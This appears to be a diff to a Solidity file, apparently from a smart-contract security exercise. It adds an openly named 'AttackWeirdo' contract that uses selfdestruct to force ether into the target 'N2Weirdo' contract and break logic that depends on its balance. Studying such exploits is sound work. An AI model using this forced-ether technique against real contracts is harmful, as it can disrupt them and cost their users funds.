@@ -25,3 +25,19 @@ contract N2Weirdo {
         emit FundsRecovered(msg.sender, _balance);
     }
 }
+
+contract AttackWeirdo {
+    N2Weirdo public weirdo;
+
+    constructor(address _weirdo) payable {
+        require(
+            msg.value == 0.0001 ether,
+            "You must send 0.0001 ether to create the vault"
+        );
+        weirdo = N2Weirdo(_weirdo);
+    }
+
+    function attack() public {
+        selfdestruct(payable(address(weirdo)));
+    }
+}
